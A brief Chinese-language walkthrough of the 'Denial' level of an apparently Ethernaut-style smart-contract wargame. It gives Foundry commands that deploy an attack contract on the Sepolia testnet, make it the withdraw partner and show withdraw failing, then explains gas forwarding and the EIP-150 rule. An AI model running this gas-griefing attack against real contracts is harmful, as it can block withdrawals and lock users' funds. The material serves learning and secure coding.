# 21-Denial
```
# 1. 部署攻击合约
forge create src/21-Denial/DenialAttack.sol:DenialAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast
Deployed to: 0xef1D7369465f0c3Aa2d02b62294f70072c5374a4

# 2. 设置为 partner
cast send $Denial_ADDRESS "setWithdrawPartner(address)" $DenialAttack_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
cast send $Denial_ADDRESS "partner()"  --rpc-url $sepolia_rpc --private-key $PRIVATE_KEY

# 3. 检查合约余额（应该 > 0）
cast call $Denial_ADDRESS "contractBalance()" --rpc-url $sepolia_rpc

# 4. 尝试 withdraw（应该失败）
cast send $Denial_ADDRESS "withdraw()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --gas-limit 900000  \
    -vvvv
```

### 考察点 
- call会转发所有剩余gas,不限制被调用合约的gas使用
- transfer固定提供2300gas,如果当前剩余gas<2300+overhead 就会revert
EIP-150 规则：call 至少保留 1/64 的 gas 给调用者,转发最多 63/64 的 gas
如果您使用低级别调用以在外部调用恢复的情况下继续执行，请确保您指定固定的gas费用。